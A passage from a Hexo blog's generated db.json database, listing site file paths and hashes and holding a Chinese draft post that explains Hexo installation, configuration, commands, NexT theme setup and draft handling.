92},{"_id":"public/archives/2018/08/index.html","hash":"21ad1765bdfa72d4c6393e1ff9ef9ff44f9543ef","modified":1551199435693},{"_id":"public/archives/2018/09/index.html","hash":"c7328d9dbe06478423b47dd0b671784e0f3aadd6","modified":1551199435693},{"_id":"public/archives/2018/10/index.html","hash":"83fa901c32edc50ed0efd6877c36b1850a7ac854","modified":1551199435693},{"_id":"public/index.html","hash":"491f9213ab6ee6d73fbba0090be54fdcb4f4ef45","modified":1551199435693},{"_id":"public/page/2/index.html","hash":"1d8336e2cf2f92d449b077188bf3578d7f5975cf","modified":1551199435693},{"_id":"public/page/3/index.html","hash":"e850a315ef34063ec03a2beb68218f86f7113608","modified":1551199435693},{"_id":"public/page/4/index.html","hash":"e3f4c8426613625cbfab2eda03c6616d0c254c05","modified":1551199435693},{"_id":"public/page/5/index.html","hash":"3e0ddbf949a69e24653d748cd77e03ab1c473530","modified":1551199435693},{"_id":"public/page/6/index.html","hash":"8579137e050ff9bb7c015d2d57cfa44e22093c83","modified":1551199435693},{"_id":"public/page/7/index.html","hash":"57a6a2517e8c14417e452c86d1cff9df6d79ebbd","modified":1551199435693},{"_id":"public/page/8/index.html","hash":"22378c1cfc27c0983fe423dfa625b936b6ee6a1d","modified":1551199435693},{"_id":"public/tags/生活随想/index.html","hash":"5e67a1b0c337d4b6075b09327561b9f467950513","modified":1551199435694},{"_id":"public/tags/mysql/index.html","hash":"7b3063bf44ecd7e67e365db264bf423461b071d7","modified":1551199435694},{"_id":"public/tags/javascript/index.html","hash":"e4166b86f89165cf9a44fdb2c6a61c371e917592","modified":1551199435694},{"_id":"public/tags/javascript/page/2/index.html","hash":"a3ca37d36d1c7bb9ac5c2994f676cc3275267286","modified":1551199435694},{"_id":"public/tags/git/index.html","hash":"e9f714711c19a9c07dbf4bea1e7b85e2404d1b7e","modified":1551199435694},{"_id":"public/tags/前端/index.html","hash":"88a246d0668d30cb9959905b43a9f1d13faf858c","modified":1551199435694},{"_id":"public/tags/css/index.html","hash":"363366ce0e8b49f2c484c08d4a9e01779815b0b8","modified":1551199435694},{"_id":"public/tags/markdown/index.html","hash":"c6860ab0c339f208af9290ef9e65b81bc46c207d","modified":1551199435694},{"_id":"public/tags/vue/index.html","hash":"d9732d674bf6d007717422d3545dca52920e78ad","modified":1551199435694},{"_id":"public/tags/浏览器/index.html","hash":"6a311fe571820445d3678924ac7bcd6bda19c206","modified":1551199435694},{"_id":"public/tags/浏览器/page/2/index.html","hash":"8d75d54abc5a8960ecece3f64f439a7c3047b31b","modified":1551199435694},{"_id":"public/tags/计算机基础/index.html","hash":"4e17488be26292216bfae6151993ad2693b6bd38","modified":1551199435694},{"_id":"public/tags/图解算法/index.html","hash":"f1dd144263ccc718d732517d99a754c8a9b3b014","modified":1551199435694},{"_id":"public/tags/数据结构与算法/index.html","hash":"644257ae226b2a688f4615db5ddce69cdcd7ae46","modified":1551199435694},{"_id":"public/tags/node/index.html","hash":"ad1adce5290e3743b0900806fda164284bd16959","modified":1551199435694},{"_id":"public/tags/Http/index.html","hash":"99ef2caa9469280c09a35540c15ebe28573247bd","modified":1551199435694},{"_id":"public/tags/计算机网络/index.html","hash":"7b0ddee7e939eb5386e5c8d2d069a8391698ce11","modified":1551199435695},{"_id":"public/tags/nginx/index.html","hash":"2d32ab0ec96152ccfda080ec8e3d1dfca20ec01f","modified":1551199435695},{"_id":"public/tags/Typescript/index.html","hash":"d50cd13e6be30270955e62e3924c38eb88033dea","modified":1551199435695},{"_id":"public/tags/Vue/index.html","hash":"c3a98cc979843db68181cfb1b686d73f31035d68","modified":1551199435695},{"_id":"public/tags/工作复盘/index.html","hash":"72e0bc2ea00131274b50806a87ae1b1ab13d18a1","modified":1551199435695},{"_id":"public/2019/02/26/geek-self-cultivation/index.html","hash":"63940efc23a5ac8bc3b5a286e633dc6b543ee6ef","modified":1551199435707},{"_id":"public/2019/01/08/git-branch-use/index.html","hash":"0dda550c354850b2e70814eb8a471a6fcf51f84d","modified":1551199435707},{"_id":"public/2019/01/06/git-branch/index.html","hash":"53a44e6133dac6b05d68fbf991a825d2365634c3","modified":1551199435707},{"_id":"public/archives/2019/index.html","hash":"46d1b7b53d570e77f8db12b4539e1a70c11a37cf","modified":1551199435707},{"_id":"public/archives/2019/01/index.html","hash":"2d8d850b8896d68ca1fb1904dcaa83806a517e52","modified":1551199435707},{"_id":"public/archives/2019/02/index.html","hash":"b1819d7457aeb652bf554a6806d7d3aa6f288e7e","modified":1551199435707},{"_id":"public/favicon.ico","hash":"4597fd67baf7f5b57e01f05e6fa36dfed5f6990d","modified":1551199435715},{"_id":"public/images/algolia_logo.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1551199435715},{"_id":"public/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1551199435715},{"_id":"public/images/apple-touch-icon-next.png","hash":"2959dbc97f31c80283e67104fe0854e2369e40aa","modified":1551199435715},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1551199435715},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1551199435715},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1551199435715},{"_id":"public/images/avatar.jpg","hash":"d59bece9ddd27c6911abfd0dcd7259923ade3b7a","modified":1551199435715},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1551199435715},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1551199435715},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1551199435715},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1551199435715},{"_id":"public/images/favicon-16x16-next.png","hash":"943a0d67a9cdf8c198109b28f9dbd42f761d11c3","modified":1551199435716},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1551199435716},{"_id":"public/images/favicon-32x32-next.png","hash":"0749d7b24b0d2fae1c8eb7f671ad4646ee1894b1","modified":1551199435716},{"_id":"public/images/logo.svg","hash":"d29cacbae1bdc4bbccb542107ee0524fe55ad6de","modified":1551199435716},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1551199435716},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1551199435716},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1551199435716},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1551199435716},{"_id":"public/lib/fastclick/LICENSE","hash":"dcd5b6b43095d9e90353a28b09cb269de8d4838e","modified":1551199435716},{"_id":"public/lib/font-awesome/HELP-US-OUT.txt","hash":"4f7bf961f1bed448f6ba99aeb9219fabf930ba96","modified":1551199435716},{"_id":"public/lib/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1551199435716},{"_id":"public/lib/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1551199435716},{"_id":"public/lib/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1551199435716},{"_id":"public/lib/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1551199435716},{"_id":"public/lib/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1551199435716},{"_id":"public/lib/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1551199435716},{"_id":"public/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1551199435717},{"_id":"public/lib/Han/dist/font/han.otf","hash":"f1f6bb8f461f5672e000380195d3d2358a28494c","modified":1551199435718},{"_id":"public/lib/Han/dist/font/han.woff","hash":"f38ff9b2eecaa17b50b66aa2dae87e9e7436d195","modified":1551199435718},{"_id":"public/lib/Han/dist/font/han.woff2","hash":"623af3ed5423371ac136a4fe0e8cc7bb7396037a","modified":1551199435718},{"_id":"public/lib/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1551199435718},{"_id":"public/lib/Han/dist/font/han-space.otf","hash":"07436f011b44051f61b8329c99de4bec64e86f4b","modified":1551199435718},{"_id":"public/lib/Han/dist/font/han-space.woff","hash":"7a635062b10bf5662ae1d218ba0980171005d060","modified":1551199435718},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1551199436504},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1551199436518},{"_id":"public/js/src/affix.js","hash":"978e0422b5bf1b560236d8d10ebc1adcf66392e3","modified":1551199436540},{"_id":"public/js/src/algolia-search.js","hash":"b172f697ed339a24b1e80261075232978d164c35","modified":1551199436540},{"_id":"public/js/src/bootstrap.js","hash":"034bc8113e0966fe2096ba5b56061bbf10ef0512","modified":1551199436540},{"_id":"public/js/src/exturl.js","hash":"e42e2aaab7bf4c19a0c8e779140e079c6aa5c0b1","modified":1551199436541},{"_id":"public/js/src/hook-duoshuo.js","hash":"a6119070c0119f33e08b29da7d2cce2635eb40a0","modified":1551199436541},{"_id":"public/js/src/post-details.js","hash":"a13f45f7aa8291cf7244ec5ba93907d119c5dbdd","modified":1551199436541},{"_id":"public/js/src/motion.js","hash":"754b294394f102c8fd9423a1789ddb1201677898","modified":1551199436541},{"_id":"public/js/src/js.cookie.js","hash":"9b37973a90fd50e71ea91682265715e45ae82c75","modified":1551199436541},{"_id":"public/js/src/scroll-cookie.js","hash":"09dc828cbf5f31158ff6250d2bf7c3cde6365c67","modified":1551199436541},{"_id":"public/js/src/scrollspy.js","hash":"fe4da1b9fe73518226446f5f27d2831e4426fc35","modified":1551199436541},{"_id":"public/lib/algolia-instant-search/instantsearch.min.css","hash":"90ef19edc982645b118b095615838d9c5eaba0de","modified":1551199436541},{"_id":"public/lib/canvas-ribbon/canvas-ribbon.js","hash":"ff5915eb2596e890a2fc6697c864f861a1995ec0","modified":1551199436541},{"_id":"public/lib/canvas-nest/canvas-nest.min.js","hash":"0387e75e23b1db108a755073fe52a0d03eb391a7","modified":1551199436541},{"_id":"public/js/src/utils.js","hash":"9b1325801d27213083d1487a12b1a62b539ab6f8","modified":1551199436541},{"_id":"public/lib/fastclick/bower.json","hash":"4dcecf83afddba148464d5339c93f6d0aa9f42e9","modified":1551199436541},{"_id":"public/lib/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1551199436541},{"_id":"public/lib/jquery_lazyload/bower.json","hash":"ae3c3b61e6e7f9e1d7e3585ad854380ecc04cf53","modified":1551199436541},{"_id":"public/lib/jquery_lazyload/jquery.lazyload.js","hash":"481fd478650e12b67c201a0ea41e92743f8b45a3","modified":1551199436541},{"_id":"public/lib/needsharebutton/needsharebutton.css","hash":"3ef0020a1815ca6151ea4886cd0d37421ae3695c","modified":1551199436541},{"_id":"public/lib/pace/pace-theme-barber-shop.min.css","hash":"ee0d51446cb4ffe1bb96bd7bc8c8e046dddfcf46","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-big-counter.min.css","hash":"5b561dc328af4c4d512e20a76fe964d113a32ba8","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-center-atom.min.css","hash":"dcf79c24fe5350fb73d8038573a104e73639e9d3","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-bounce.min.css","hash":"f6bdb9a785b7979dd8ec5c60e278af955ef1e585","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-center-radar.min.css","hash":"ab7cba998bf4c03b13df342bf43647fa4f419783","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-center-simple.min.css","hash":"67f44c947548bd4d77e7590d3f59e236cbf9e98a","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-loading-bar.min.css","hash":"7ee28875dfc1230d76c537f6605766e8d4011e9f","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-fill-left.min.css","hash":"0bec1e235a4a2cccda3f993b205424e1441a44ae","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-mac-osx.min.css","hash":"9f2e7b51b084da407863826b25265b31150b3821","modified":1551199436542},{"_id":"public/lib/pace/pace-theme-minimal.min.css","hash":"9cd783cceb8a191f3c8b5d81f7a430ecc3e489d3","modified":1551199436542},{"_id":"public/lib/jquery_lazyload/jquery.scrollstop.js","hash":"0e9a81785a011c98be5ea821a8ed7d411818cfd1","modified":1551199436542},{"_id":"public/lib/pace/pace.min.js","hash":"9944dfb7814b911090e96446cea4d36e2b487234","modified":1551199436543},{"_id":"public/lib/velocity/bower.json","hash":"0ef14e7ccdfba5db6eb3f8fc6aa3b47282c36409","modified":1551199436543},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1551199436543},{"_id":"public/js/src/schemes/pisces.js","hash":"8050a5b2683d1d77238c5762b6bd89c543daed6e","modified":1551199436543},{"_id":"public/lib/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1551199436543},{"_id":"public/lib/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1551199436543},{"_id":"public/lib/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1551199436544},{"_id":"public/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1551199436544},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1551199436544},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1551199436544},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1551199436544},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1551199436545},{"_id":"public/lib/pace/pace-theme-center-circle.min.css","hash":"a4066769c78affbfbc5e30a600e2c7862cd532e0","modified":1551199436545},{"_id":"public/lib/pace/pace-theme-corner-indicator.min.css","hash":"b3c64c973f31884e3d8145989476707333406b9a","modified":1551199436545},{"_id":"public/lib/pace/pace-theme-flash.min.css","hash":"13ace22c40312d7bbd8d9c1e50eff897a7a497d8","modified":1551199436545},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1551199436545},{"_id":"public/lib/fastclick/README.html","hash":"da3c74d484c73cc7df565e8abbfa4d6a5a18d4da","modified":1551199436546},{"_id":"public/lib/jquery_lazyload/README.html","hash":"bde24335f6bc09d8801c0dcd7274f71b466552bd","modified":1551199436546},{"_id":"public/lib/jquery_lazyload/CONTRIBUTING.html","hash":"a6358170d346af13b1452ac157b60505bec7015c","modified":1551199436547},{"_id":"public/css/main.css","hash":"22e2d7e8a60ec28c1d5b179ccb82f5f4e65e49eb","modified":1551199436547},{"_id":"public/lib/needsharebutton/font-embedded.css","hash":"c39d37278c1e178838732af21bd26cd0baeddfe0","modified":1551199436547},{"_id":"public/lib/three/canvas_lines.min.js","hash":"dce4a3b65f8bf958f973690caa7ec4952f353b0c","modified":1551199436547},{"_id":"public/lib/three/canvas_sphere.min.js","hash":"d8ea241a53c135a650f7335d2b6982b899fd58a9","modified":1551199436547},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1551199436548},{"_id":"public/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1551199436548},{"_id":"public/lib/three/three-waves.min.js","hash":"d968cba6b3a50b3626a02d67b544f349d83b147c","modified":1551199436548},{"_id":"public/lib/needsharebutton/needsharebutton.js","hash":"9885fd9bea5e7ebafc5b1de9d17be5e106248d96","modified":1551199436548},{"_id":"public/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1551199436548},{"_id":"public/lib/Han/dist/han.css","hash":"bd40da3fba8735df5850956814e312bd7b3193d7","modified":1551199436548},{"_id":"public/lib/Han/dist/han.min.css","hash":"a0c9e32549a8b8cf327ab9227b037f323cdb60ee","modified":1551199436548},{"_id":"public/lib/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1551199436548},{"_id":"public/lib/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1551199436548},{"_id":"public/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1551199436548},{"_id":"public/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1551199436548},{"_id":"public/lib/Han/dist/han.min.js","hash":"f559c68a25065a14f47da954a7617d87263e409d","modified":1551199436549},{"_id":"public/lib/Han/dist/han.js","hash":"e345397e0585c9fed1449e614ec13e0224acf2ab","modified":1551199436549},{"_id":"public/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1551199436549},{"_id":"public/lib/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1551199436549},{"_id":"public/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1551199436549},{"_id":"public/lib/three/three.min.js","hash":"73f4cdc17e51a72b9bf5b9291f65386d615c483b","modified":1551199436549},{"_id":"public/lib/font-awesome/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1551199436549},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1551199436550},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1551199436550},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"98a8aa5cf7d62c2eff5f07ede8d844b874ef06ed","modified":1551199436592}],"Category":[],"Data":[],"Page":[{"title":"categories","date":"2017-05-27T09:14:43.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2017-05-27 17:14:43\ntype: \"categories\"\ncomments: false\n---\n","updated":"2018-02-26T02:53:49.778Z","path":"categories/index.html","layout":"page","_id":"cjsm034j800010iofyiko2k37","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2017-05-27T08:59:02.000Z","type":"about","comments":0,"_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2017-05-27 16:59:02\ntype: \"about\"\ncomments: false\n---\n","updated":"2018-02-26T02:53:49.778Z","path":"about/index.html","layout":"page","_id":"cjsm034jc00030iofwxnkhmcy","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2017-03-08T08:02:44.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2017-03-08 16:02:44\ntype: \"tags\"\ncomments: false\n---\n","updated":"2018-02-26T02:53:49.781Z","path":"tags/index.html","layout":"page","_id":"cjsm034qh00280iofbblzbq0z","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Hexo的开始","date":"2017-03-07T07:29:00.000Z","comments":0,"_content":"\n# 基于 Hexo 的博客\n\n> 我的第一个页面哎~\n\n## 开始\n\n> Hexo 的[Github](https://github.com/hexojs)和[中文官网](https://hexo.io/zh-cn/)\n\n#### 下载\n\n* Node 和 Git 必须要有\n* `npm install -g hexo-cli`下载 hexo 的脚手架,可以全局使用 hexo 命令\n\n---\n\n#### 建站\n\n* `hexo init <folder>`初始化文件夹，如果不写 folder，那么则在当前目录初始化，如果写了 folder 则在当前目录创建这个 folder，并在 folder 里面初始化\n* `npm install`下载依赖\n\n---\n\n#### 配置\n\n> 网站分别有两个配置文件。一个是 _站点配置文件_ 即根目录下的*config.yml,一个是 *主题配置文件\\_ 即 themes 文件夹内的\\_config.yml\n\n1.  **网站**\n\n| 参数        |                                     含义                                     |\n| ----------- | :--------------------------------------------------------------------------: |\n| title       |                                   网站名称                                   |\n| subtitle    |                                  网站副标题                                  |\n| description | 网站描述（用于 SEO，告诉搜索引擎一个关于您站点的简单描述，通常可以写关键词） |\n| author      |                                  本作者啦~                                   |\n| language    |                            网站语言，这里是 zh-CN                            |\n| timezone    |                          网站时区，默认是电脑的时区                          |\n| url         |                  这里是https://yokiyokiyoki.github.io/blog/                  |\n| root        |               根目录是/blog/，这里是 css 和 js 找到资源的地方                |\n\n2.  **拓展**\n\n| 参数   |                                           含义                                            |\n| ------ | :---------------------------------------------------------------------------------------: |\n| theme  |         启用主题名称，与 theme 里的名字要一样，这里是 meterial，默认是 landscape          |\n| deploy | 部署到 GitHub 的`type: git,repo: https://github.com/yokiyokiyoki/blog.git,branch: master` |\n\n---\n\n#### 命令\n\n* `hexo new ..`写新的日志\n* `hexo g`生成静态文件,不简写的话是`hexo generate`\n* `hexo d`部署到`github`，不简写的话是`hexo deploy`（可以先删除 deploy_git 文件）\n* `hexo s`本地启动服务预览，不简写的话是`hexo server`\n* `hexo clean`清除缓存文件 (db.json) 和已生成的静态文件 (public)。在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，可能需要运行该命令。\n* `hexo version`显示`Hexo`的版本\n\n---\n\n## 主题\n\n> 采用了 next 主题，[GitHub](https://github.com/iissnan/hexo-theme-next)和[官网](http://theme-next.iissnan.com/)\n\n* 安装「Next」\n  * 在`theme`文件夹下面采用`git clone`下载，缺点是很慢，优点是方便更新\n  * 更新：直接拉取远程分支更新。\n  * 在`theme`文件夹下，然后改名为 **next**\n\n---\n\n## 分支发布策略\n\n* 直接在 hexo 开发，master 不用管\n* 第一次先下载好 next 主题，不然会生成空的 html\n* 可以先删除`.deploy_git`文件\n* hexo 分支用来保存源代码和编辑文章，每次编辑完文章首先应该推送 hexo 分支到远端，先`hexo clean`然后执行`hexo g`最后`hexo d`,就会自动部署。\n* master 分支用来部署静态页面。\n\n## 私密文章\n\n> 草稿其实就是相当于很多博客都有的`私密文章`功能\n\n* `hexo new draft \"draftName\"`会在 source/\\_drafts 目录下生成一个文件，但是这个文件不被显示在页面上，链接也访问不到。也就是说如果你想把某一篇文章移除显示，又不舍得删除，可以把它移动到\\_drafts 目录之中。\n* 如果希望强行预览草稿，更改配置文件。`reder_drafts:true`。或者`hexo server --drafts`启动命令行\n* 也可以发布草稿，`hexo publish [layout] <title>`,`layout` 来指定布局\n","source":"_drafts/hexo-practice.md","raw":"---\ntitle: Hexo的开始\ndate: 2017-03-07 15:29:00\ntags: \"Hexo\"\ncomments: false\n---\n\n# 基于 Hexo 的博客\n\n> 我的第一个页面哎~\n\n## 开始\n\n> Hexo 的[Github](https://github.com/hexojs)和[中文官网](https://hexo.io/zh-cn/)\n\n#### 下载\n\n* Node 和 Git 必须要有\n* `npm install -g hexo-cli`下载 hexo 的脚手架,可以全局使用 hexo 命令\n\n---\n\n#### 建站\n\n* `hexo init <folder>`初始化文件夹，如果不写 folder，那么则在当前目录初始化，如果写了 folder 则在当前目录创建这个 folder，并在 folder 里面初始化\n* `npm install`下载依赖\n\n---\n\n#### 配置\n\n> 网站分别有两个配置文件。一个是 _站点配置文件_ 即根目录下的*config.yml,一个是 *主题配置文件\\_ 即 themes 文件夹内的\\_config.yml\n\n1.  **网站**\n\n| 参数        |                                     含义                                     |\n| ----------- | :--------------------------------------------------------------------------: |\n| title       |                                   网站名称                                   |\n| subtitle    |                                  网站副标题                                  |\n| description | 网站描述（用于 SEO，告诉搜索引擎一个关于您站点的简单描述，通常可以写关键词） |\n| author      |                                  本作者啦~                                   |\n| language    |                            网站语言，这里是 zh-CN                            |\n| timezone    |                          网站时区，默认是电脑的时区                          |\n| url         |                  这里是https://yokiyokiyoki.github.io/blog/                  |\n| root        |               根目录是/blog/，这里是 css 和 js 找到资源的地方                |\n\n2.  **拓展**\n\n| 参数   |                                           含义                                            |\n| ------ | :---------------------------------------------------------------------------------------: |\n| theme  |         启用主题名称，与 theme 里的名字要一样，这里是 meterial，默认是 landscape          |\n| deploy | 部署到 GitHub 的`type: git,repo: https://github.com/yokiyokiyoki/blog.git,branch: master` |\n\n---\n\n#### 命令\n\n* `hexo new ..`写新的日志\n* `hexo g`生成静态文件,不简写的话是`hexo generate`\n* `hexo d`部署到`github`，不简写的话是`hexo deploy`（可以先删除 deploy_git 文件）\n* `hexo s`本地启动服务预览，不简写的话是`hexo server`\n* `hexo clean`清除缓存文件 (db.json) 和已生成的静态文件 (public)。在某些情况（尤其是更换主题后），如果发现对站点的更改无论如何也不生效，可能需要运行该命令。\n* `hexo version`显示`Hexo`的版本\n\n---\n\n## 主题\n\n> 采用了 next 主题，[GitHub](https://github.com/iissnan/hexo-theme-next)和[官网](http://theme-next.iissnan.com/)\n\n* 安装「Next」\n  * 在`theme`文件夹下面采用`git clone`下载，缺点是很慢，优点是方便更新\n  * 更新：直接拉取远程分支更新。\n  * 在`theme`文件夹下，然后改名为 **next**\n\n---\n\n## 分支发布策略\n\n* 直接在 hexo 开发，master 不用管\n* 第一次先下载好 next 主题，不然会生成空的 html\n* 可以先删除`.deploy_git`文件\n* hexo 分支用来保存源代码和编辑文章，每次编辑完文章首先应该推送 hexo 分支到远端，先`hexo clean`然后执行`hexo g`最后`hexo d`,就会自动部署。\n* master 分支用来部署静态页面。\n\n## 私密文章\n\n> 草稿其实就是相当于很多博客都有的`私密文章`功能\n\n* `hexo new draft \"draftName\"`会在 source/\\_drafts 目录下生成一个文件，但是这个文件不被显示在页面上，链接也访问不到。也就是说如果你想把某一篇文章移除显示，又不舍得删除，可以把它移动到\\_drafts 目录之中。\n* 如果希望强行预览草稿，更改配置文件。`reder_drafts:true`。或者`hexo server --drafts`启动命令行\n* 也可以发布草稿，`hexo publish [layout] <title>`,`layout` 来指定布局\n","slug":"hexo-practice","published":0,"updated":"2018-04-09T03:51:22.340Z","layout":"post","photos":[],"link":"","_id":"cjsm034iu00000ioft11x0cf5","content":"<h1 id=\"基于-Hexo-的博客\"><a href=\"#基于-Hexo-的博客\" class=\"headerlink\" title=\"基于 Hexo 的博客\"></a>基于 Hexo 的博客</h1><blockquote>\n<p>我的第一个页面哎~</p>\n</blockquote>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><blockquote>\n<p>Hexo 的<a href=\"https://github.com/hexojs\" target=\"_blank\" rel=\"noopener\">Github</a>和<a href=\"https://hexo.io/zh-cn/\" target=\"_blank\" rel=\"noopener\">中文官网</a></p>\n</blockquote>\n<h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><ul>\n<li>Node 和 Git 必须要有</li>\n<li><code>npm install -g hexo-cli</code>下载 hexo 的脚手架,可以全局使用 hexo 命令</li>\n</ul>\n<hr>\n<h4 id=\"建站\"><a href=\"#建站\" class=\"headerlink\" title=\"建站\"></a>建站</h4><ul>\n<li><code>hexo init &lt;folder&gt;</code>初始化文件夹，如果不写 folder，那么则在当前目录初始化，如果写了 folder 则在当前目录创建这个 folder，并在 folder 里面初始化</li>\n<li><code>npm install</code>下载依赖</li>\n</ul>\n<hr>\n<h4 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h4><blockquote>\n<p>网站分别有两个配置文件。一个是 <em>站点配置文件</em> 即根目录下的<em>config.yml,一个是 </em>主题配置文件_ 即 themes 文件夹内的_config.yml</p>\n</blockquote>\n<ol>\n<li><strong>网站</strong></li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th style=\"text-align:center\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>title</td>\n<td style=\"text-align:center\">网站名称</td>\n</tr>\n<tr>\n<td>subtitle</td>\n<td style=\"text-align:center\">网站副标题</td>\n</tr>\n<tr>\n<td>description</td>\n<td style=\"text-align:center\">网站描述（用于 SEO，告诉搜索引擎一个关于您站点的简单描述，通常可以写关键词）</td>\n</tr>\n<tr>\n<td>author</td>\n<td style=\"text-align:center\">本作者啦~</td>\n</tr>\n<tr>\n<td>language</td>\n<td style=\"text-align:center\">网站语言，这里是 zh-CN</td>\n</tr>\n<tr>\n<td>timezone</td>\n<td style=\"text-align:center\">网站时区，默认是电脑的时区</td>\n</tr>\n<tr>\n<td>url</td>\n<td style=\"text-align:center\">这里是<a href=\"https://yokiyokiyoki.github.io/blog/\">https://yokiyokiyoki.github.io/blog/</a></td>\n</tr>\n<tr>\n<td>root</td>\n<td style=\"text-align:center\">根目录是/blog/，这里是 css 和 js 